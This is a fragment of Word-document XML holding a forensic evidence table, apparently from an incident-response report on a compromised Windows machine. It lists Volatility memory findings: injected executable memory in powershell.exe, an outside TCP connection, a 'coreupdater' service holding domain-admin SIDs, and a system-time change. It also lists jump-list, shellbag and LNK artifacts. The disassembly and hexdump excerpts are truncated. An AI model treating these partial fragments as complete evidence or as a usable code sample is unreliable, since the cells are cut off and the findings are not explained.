            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.netstat.NetStat.jsonl#12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_malfind</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "CommitCharge": "36", "Disasm": "\"\n0x10c6c070000:\tpop\tr10\n0x10c6c070002:\tnop\t\n0x10c6c070003:\tadd\tbyte ptr [rbx], al\n0x10c6c070005:\tadd\tbyte ptr [rax], al\n0x10c6c070007:\tadd\tbyte ptr [rax + rax], al\n0x10c6c07000a:\tadd\tbyte ptr [rax], al\"", "End VPN": "1152863780863", "File output": "Disabled", "Hexdump": "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.malfind.Malfind.jsonl#6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_netstat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "ForeignAddr": "203.78.103.109", "ForeignPort": "443", "LocalAddr": "10.42.85.115", "LocalPort": "50972", "Offset": "209519140929552", "Proto": "TCPv4", "State": "ESTABLISHED"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.netstat.NetStat.jsonl#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016</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"Domain Admins", "PID": "508", "Process": "powershell.exe", "SID": "S-1-5-21-2232410529-1445159330-2725690660-512"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#1062</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_suspicious_threads</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Address": "1152857931776", "Context": "Win32Start", "Note": "VAD at base address (0x10c6bb00000) hosting this thread has an unexpected starting protection PAGE_EXECUTE_READWRITE", "PID": "3316", "Process": "powershell.exe", "TID": "3892", "VAD Path": "&lt;Non-File Backed Region&gt;"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.suspicious_threads.SuspiciousThreads.jsonl#44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_malfind</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "CommitCharge": "1", "Disasm": "\"\n0x7df4f5a80000:\tadd\tbyte ptr [rax + rax + 0x65], dh\n0x7df4f5a80004:\tadd\tbyte ptr [rcx], cl\n0x7df4f5a80006:\tadd\tbyte ptr cs:[rax], dh\n0x7df4f5a8000a:\toutsb\tdx, byte ptr [rsi]\n0x7df4f5a8000b:\tadd\tbyte ptr [rdi], ah\n0x7df4f5a8000e:\tor\tbyte ptr [rdx], al\n0x7df4f5a80010:\tjg\t0x7df4f5a8001a\n0x7df4f5a80012:\tadd\tbyte ptr [rcx], a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.malfind.Malfind.jsonl#3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_svclist</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Display": "coreupdater", "Name": "coreupdater", "Offset": "1402927956048", "Order": "662", "Start": "SERVICE_AUTO_START", "State": "SERVICE_STOPPED", "Type": "SERVICE_WIN32_OWN_PROCESS"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.svclist.SvcList.jsonl#22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-020</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"Administrator", "PID": "8324", "Process": "coreupdater.ex", "SID": "S-1-5-21-2232410529-1445159330-2725690660-500"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#619</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-023, I-013</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"Domain Admins", "PID": "8324", "Process": "coreupdater.ex", "SID": "S-1-5-21-2232410529-1445159330-2725690660-512"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#632</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"Enterprise Admins", "PID": "8324", "Process": "coreupdater.ex", "SID": "S-1-5-21-2232410529-1445159330-2725690660-519"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#634</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raw.vol_getsids</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Name": "Domain Admins", "PID": "6544", "Process": "FTK Imager.exe", "SID": "S-1-5-21-2232410529-1445159330-2725690660-512"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#1176</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_netscan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "ForeignAddr": "10.42.85.10", "ForeignPort": "445", "LocalAddr": "10.42.85.115", "LocalPort": "50957", "Offset": "209519101090720", "Proto": "TCPv4", "State": "ESTABLISHED"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.netscan.NetScan.jsonl#88</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_psxview</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Name": "spoolsv.exe", "Offset(Virtual)": "209519070331392", "PID": "2188", "csrss": "true", "pslist": "true", "psscan": "true", "thrdscan": "true"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.psxview.PsXView.jsonl#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-030</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_malfind</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "CommitCharge": "256", "Disasm": "\"\n0x25453170000:\tor\tecx, dword ptr [rcx - 0x50f7d6f4]\n0x25453170006:\tadd\tdword ptr [rdi + riz*2], edx\n0x25453170009:\tadd\tedi, edi\n0x2545317000b:\tin\tal, dx\n0x2545317000d:\tcmp\tcl, byte ptr [rax]\"", "End VPN": "2561195573247", "File output": "Disabled", "Hexdump": "0b 89 0c 29 08 af 01 14 67 01 ff 36 ec 3a 08 07 37 04 64 11 04 48 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.malfind.Malfind.jsonl#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-030</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:03:44.539499</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded)</w:t>
              <w:br/>
              <w:t>C:\Windows\System32</w:t>
              <w:br/>
              <w:t>Windows Explorer Windows 8.1 interactions=1 machine=desktop-sdn1rpt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261025191825_AutomaticDestinations.csv#19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:03:46</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Windows\System32</w:t>
              <w:br/>
              <w:t>Directory System32 MFT=3254 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-027, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-02-25 17:36:10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>E:\</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=60:57:18:83:4f:f1 volume=A6125E71 Removable storage media (Floppy, USB) size=4096</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#25</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\ricksanchez\AppData\Roaming\Microsoft\Windows\Recent\Incident_drive (E).lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-028</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:02.307663</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\svchost.exe</w:t>
              <w:br/>
              <w:t>Security 4616 | Microsoft-Windows-Security-Auditing | The system time was changed | PreviousTime: 2020-09-18 05:58:01.9239364 | NewTime: 2020-09-18 04:58:02.3055654 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38143</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
